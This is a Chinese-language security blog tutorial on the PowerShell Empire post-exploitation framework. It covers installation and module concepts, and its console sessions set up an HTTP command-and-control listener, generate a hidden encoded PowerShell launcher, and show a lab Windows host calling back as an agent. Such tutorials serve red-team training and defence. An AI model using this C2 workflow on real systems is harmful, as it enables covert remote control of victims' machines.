<!doctype html><html><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><title>Intranet Space - Empire - 倾旋的博客</title><meta name=viewport content="width=device-width,initial-scale=1">
<link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/normalize.css><link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/main.css><link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/extra.css><link id=dark-scheme rel=stylesheet type=text/css href=https://payloads.online/css/dark.css><script src=https://payloads.online/js/feather.min.js></script><script src=https://payloads.online/js/main.js></script><link rel=stylesheet href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&family=Inter:wght@400;500;600;700&display=swap"><link rel=stylesheet href=/css/fontawesome.css></head><body><div class="container-wide wrapper"><div class=header><div class=avatar><a href=https://payloads.online/><img src=/avatar.jpeg alt=倾旋的博客></a></div><h1 class=site-title><a href=https://payloads.online/>倾旋的博客</a></h1><div class=site-description><p>现阶段在进行有效性验证/攻击模拟相关的安全研究工作，我的博客会记录一些我的学习过程和部分安全技术研究成果。</p><nav class="nav social"><ul class=flat><li><a href=https://github.com/rvn0xsy/ title=Github><i data-feather=github></i></a></li><li><a href=/index.xml title=RSS><i data-feather=rss></i></a></li><li><a href=/ title=Wechat><i data-feather=message-circle></i></a></li><span class=scheme-toggle><a href=# id=scheme-toggle></a></ul></nav></div><nav class=nav><ul class=flat><li><a href=/>首页</a></li><li><a href=/posts/>文章列表</a></li><li><a href=/tags>标签</a></li><li><a href=/projects>开源项目</a></li><li><a href=/about>关于我</a></li><li><a href=/links/>友情链接</a></li><li><a href=/message>留言</a></li><li><a href=/sponsor>赞助</a></li></ul></nav></div><div class=article-nav id=article-nav-id><div class=post><div class=post-header><div class=meta><div class=date><span class=day>15</span>
<span class=rest>Dec 2018</span></div></div><div class=matter><h1 class=title>Intranet Space - Empire</h1></div></div><aside class="show-on-mobile toc" id=static-toc><header><h3>Contents</h3></header><nav id=TableOfContents><ol><li><a href=#0x00-简介>0x00 简介</a></li><li><a href=#0x01-安装>0x01 安装</a></li><li><a href=#0x02-模块介绍>0x02 模块介绍</a><ol><li><a href=#empire-module-list>Empire Module List</a></li><li><a href=#listeners>listeners</a></li><li><a href=#agents>agents</a></li><li><a href=#stager>stager</a></li><li><a href=#module>module</a></li><li><a href=#plugins>plugins</a></li><li><a href=#creds>creds</a></li></ol></li><li><a href=#0x03-simply-use-empire>0x03 Simply use Empire</a><ol><li><a href=#如何获得agents>如何获得agents</a></li></ol></li><li><a href=#0x04-使用模块>0x04 使用模块</a><ol><li><a href=#bypass-uac>Bypass UAC</a></li><li><a href=#抓取密码>抓取密码</a></li><li><a href=#提权>提权</a></li></ol></li><li><a href=#0x05-生成stager>0x05 生成stager</a></li></ol></nav></aside><h2 id=0x00-简介>0x00 简介</h2><p><img src=https://images.payloads.online/3cc545d0-4f5f-11ec-9fe2-00d861bf4abb.jpg alt=Empire></p><p>Empire is a PowerShell and Python post-exploitation agent.</p><p><a href=http://www.powershellempire.com/>http://www.powershellempire.com/</a></p><h2 id=0x01-安装>0x01 安装</h2><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>git clone https://github.com/EmpireProject/Empire
</span></span><span style=display:flex><span>cd Empire/setup.sh
</span></span><span style=display:flex><span>./install.sh
</span></span></code></pre></td></tr></table></div></div><h2 id=0x02-模块介绍>0x02 模块介绍</h2><p><img src=https://images.payloads.online/3d21b284-4f5f-11ec-88ff-00d861bf4abb.jpg alt=72c95569361e869b11697561d9a7fcbb.png></p><h3 id=empire-module-list>Empire Module List</h3><ul><li>agents</li><li>creds</li><li>plugins</li><li>stager</li><li>listeners</li><li>module</li></ul><h3 id=listeners>listeners</h3><p><code>listeners</code>的功能是监听一个端口，通过该端口给客户端传递更多的命令和载荷。</p><h3 id=agents>agents</h3><p><code>agents</code>主要是通过<code>listeners</code>获得的主机对象，可以通过<code>list</code>查看。</p><h3 id=stager>stager</h3><p><code>stager</code>主要是用于生成初级载荷，也就是木马，在客户端执行后，客户端会主动连接<code>listeners</code>监听的端口，同时服务端的<code>agents</code>列表会出现客户端的主机信息。</p><h3 id=module>module</h3><p><code>module</code>的主要功能是通过给<code>agents</code>提供更多的功能，可通过<code>searchmodule</code>搜索。</p><h3 id=plugins>plugins</h3><p><code>plugins</code>主要用于调用和管理Empire的扩展。</p><h3 id=creds>creds</h3><p><code>creds</code>是一个存储一些<code>agents</code>上获取到的凭证。</p><h2 id=0x03-simply-use-empire>0x03 Simply use Empire</h2><h3 id=如何获得agents>如何获得agents</h3><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>./empire # 启动empire
</span></span></code></pre></td></tr></table></div></div><p><img src=https://images.payloads.online/3d7188f4-4f5f-11ec-85d8-00d861bf4abb.jpg alt=2eca886e0349b46868d2f676b44a9703.png></p><p>有285个module可以使用，1个listener在使用，0个agents。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>(Empire) &gt; listeners
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>[*] Active listeners:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  Name              Module          Host                                 Delay/Jitter   KillDate
</span></span><span style=display:flex><span>  ----              ------          ----                                 ------------   --------
</span></span><span style=display:flex><span>  Hello             http            http://192.168.117.181:80            5/0.0                      
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>(Empire: listeners) &gt; uselistener 
</span></span><span style=display:flex><span>dbx           http_com      http_hop      meterpreter   redirector    
</span></span><span style=display:flex><span>http          http_foreign  http_mapi     onedrive     
</span></span></code></pre></td></tr></table></div></div><p>创建一个<code>listeners</code>：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-gdscript3 data-lang=gdscript3><span style=display:flex><span>(Empire: listeners) <span style=color:#f92672>&gt;</span> uselistener http
</span></span><span style=display:flex><span>(Empire: listeners<span style=color:#f92672>/</span>http) <span style=color:#f92672>&gt;</span> info
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    Name: HTTP[S]
</span></span><span style=display:flex><span>Category: client_server
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Authors:
</span></span><span style=display:flex><span>  <span style=color:#960050;background-color:#1e0010>@</span>harmj0y
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Description:
</span></span><span style=display:flex><span>  Starts a http[s] listener (PowerShell <span style=color:#f92672>or</span> Python) that uses a
</span></span><span style=display:flex><span>  GET<span style=color:#f92672>/</span>POST approach<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>HTTP[S] Options:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  Name              Required    Value                            Description
</span></span><span style=display:flex><span>  <span style=color:#f92672>----</span>              <span style=color:#f92672>--------</span>    <span style=color:#f92672>-------</span>                          <span style=color:#f92672>-----------</span>
</span></span><span style=display:flex><span>  SlackToken        False                                        Your SlackBot API token to communicate with your Slack instance<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>  ProxyCreds        False       default                          Proxy credentials ([domain\]username:password) to use <span style=color:#66d9ef>for</span> request (default, none, <span style=color:#f92672>or</span> other)<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>  KillDate          False                                        Date <span style=color:#66d9ef>for</span> the listener to exit (MM<span style=color:#f92672>/</span>dd<span style=color:#f92672>/</span>yyyy)<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>  Name              True        Hello                            Name <span style=color:#66d9ef>for</span> the listener<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>  Launcher          True        powershell <span style=color:#f92672>-</span>noP <span style=color:#f92672>-</span>sta <span style=color:#f92672>-</span>w <span style=color:#ae81ff>1</span> <span style=color:#f92672>-</span>enc   Launcher string<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>  DefaultDelay      True        <span style=color:#ae81ff>5</span>                                Agent delay<span style=color:#f92672>/</span>reach back interval (<span style=color:#f92672>in</span> seconds)<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>  DefaultLostLimit  True        <span style=color:#ae81ff>60</span>                               Number of missed checkins before exiting
</span></span><span style=display:flex><span>  WorkingHours      False                                        Hours <span style=color:#66d9ef>for</span> the agent to operate (<span style=color:#ae81ff>09</span>:<span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>17</span>:<span style=color:#ae81ff>00</span>)<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>  SlackChannel      False       <span style=color:#75715e>#general                         The Slack channel or DM that notifications will be sent to.</span>
</span></span><span style=display:flex><span>  DefaultProfile    True        <span style=color:#f92672>/</span>admin<span style=color:#f92672>/</span>get<span style=color:#f92672>.</span>php,<span style=color:#f92672>/</span>news<span style=color:#f92672>.</span>php,<span style=color:#f92672>/</span>login<span style=color:#f92672>/</span> Default communication profile <span style=color:#66d9ef>for</span> the agent<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>                                process<span style=color:#f92672>.</span>php<span style=color:#f92672>|</span>Mozilla<span style=color:#f92672>/</span><span style=color:#ae81ff>5.0</span> (Windows
</span></span><span style=display:flex><span>                                NT <span style=color:#ae81ff>6.1</span>; WOW64; Trident<span style=color:#f92672>/</span><span style=color:#ae81ff>7.0</span>;
</span></span><span style=display:flex><span>                                rv:<span style=color:#ae81ff>11.0</span>) like Gecko
</span></span><span style=display:flex><span>  Host              True        http:<span style=color:#f92672>//</span><span style=color:#ae81ff>192.168</span><span style=color:#f92672>.</span><span style=color:#ae81ff>117.181</span>:<span style=color:#ae81ff>80</span>        Hostname<span style=color:#f92672>/</span><span style=color:#a6e22e>IP</span> <span style=color:#66d9ef>for</span> staging<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>  CertPath          False                                        Certificate path <span style=color:#66d9ef>for</span> https listeners<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>  DefaultJitter     True        <span style=color:#ae81ff>0.0</span>                              Jitter <span style=color:#f92672>in</span> agent reachback interval (<span style=color:#ae81ff>0.0</span><span style=color:#f92672>-</span><span style=color:#ae81ff>1.0</span>)<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>  Proxy             False       default                          Proxy to use <span style=color:#66d9ef>for</span> request (default, none, <span style=color:#f92672>or</span> other)<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>  UserAgent         False       default                          User<span style=color:#f92672>-</span>agent string to use <span style=color:#66d9ef>for</span> the staging request (default, none, <span style=color:#f92672>or</span> other)<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>  StagingKey        True        riOB0K<span style=color:#f92672>|+*</span>:<span style=color:#ae81ff>3</span>a<span style=color:#f92672>~</span>R2xQb<span style=color:#960050;background-color:#1e0010>@</span>;U{<span style=color:#f92672>&amp;</span>Vth<span style=color:#f92672>&gt;!</span><span style=color:#ae81ff>4</span><span style=color:#f92672>/</span>Gd Staging key <span style=color:#66d9ef>for</span> initial agent negotiation<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>  BindIP            True        <span style=color:#ae81ff>0.0</span><span style=color:#f92672>.</span><span style=color:#ae81ff>0.0</span>                          The <span style=color:#a6e22e>IP</span> to bind to on the control server<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>  Port              True        <span style=color:#ae81ff>8089</span>                             Port <span style=color:#66d9ef>for</span> the listener<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>  ServerVersion     True        Microsoft<span style=color:#f92672>-</span>IIS<span style=color:#f92672>/</span><span style=color:#ae81ff>7.5</span>                Server header <span style=color:#66d9ef>for</span> the control server<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>  StagerURI         False                                        URI <span style=color:#66d9ef>for</span> the stager<span style=color:#f92672>.</span> Must use <span style=color:#f92672>/</span>download<span style=color:#f92672>/.</span> Example: <span style=color:#f92672>/</span>download<span style=color:#f92672>/</span>stager<span style=color:#f92672>.</span>php
</span></span></code></pre></td></tr></table></div></div><p>一般情况只需要指定Host、Port、Name即可，其他的选项可以根据场景设置。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-gdscript3 data-lang=gdscript3><span style=display:flex><span>(Empire: listeners<span style=color:#f92672>/</span>http) <span style=color:#f92672>&gt;</span> set Name newListener
</span></span><span style=display:flex><span>(Empire: listeners<span style=color:#f92672>/</span>http) <span style=color:#f92672>&gt;</span> set Port <span style=color:#ae81ff>7788</span>
</span></span><span style=display:flex><span>(Empire: listeners<span style=color:#f92672>/</span>http) <span style=color:#f92672>&gt;</span> execute
</span></span><span style=display:flex><span>[<span style=color:#f92672>*</span>] Starting listener <span style=color:#e6db74>&#39;newListener&#39;</span>
</span></span><span style=display:flex><span> <span style=color:#f92672>*</span> Serving Flask app <span style=color:#e6db74>&#34;http&#34;</span> (lazy loading)
</span></span><span style=display:flex><span> <span style=color:#f92672>*</span> <span style=color:#a6e22e>Environment</span>: production
</span></span><span style=display:flex><span>   WARNING: Do <span style=color:#f92672>not</span> use the development server <span style=color:#f92672>in</span> a production environment<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>   Use a production WSGI server instead<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span> <span style=color:#f92672>*</span> Debug mode: off
</span></span><span style=display:flex><span>[<span style=color:#f92672>+</span>] Listener successfully started<span style=color:#f92672>!</span>
</span></span></code></pre></td></tr></table></div></div><p>查看<code>listeners</code>：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">8
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>(Empire: listeners/http) &gt; listeners
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>[*] Active listeners:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  Name              Module          Host                                 Delay/Jitter   KillDate
</span></span><span style=display:flex><span>  ----              ------          ----                                 ------------   --------
</span></span><span style=display:flex><span>  Hello             http            http://192.168.117.181:80            5/0.0                      
</span></span><span style=display:flex><span>  newListener       http            http://192.168.117.181:7788            5/0.0                      
</span></span></code></pre></td></tr></table></div></div><p>生成控制命令：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>launcher powershell newListener
</span></span></code></pre></td></tr></table></div></div><p>在目标主机上执行这条指令后，可以获得一个<code>agent</code>。</p><p><strong>listeners中的Port必须和Host的端口相同</strong></p><p><img src=https://images.payloads.online/3db6ef8e-4f5f-11ec-aa5d-00d861bf4abb.jpg alt=5ce76e0d2cc5751a5185b435fa24dc00.png></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">9
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>(Empire: listeners) &gt; agents
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>[*] Active agents:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span> Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen
</span></span><span style=display:flex><span> ----     -- -----------     ------------      --------                -------            ---    -----    ---------
</span></span><span style=display:flex><span> MYZBFLEX ps 192.168.117.179 DESKTOP-7KT7GL1   DESKTOP-7KT7GL1\Rvn0xsy powershell         7256   5/0.0    2018-12-18 02:14:47
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>(Empire: agents) &gt; 
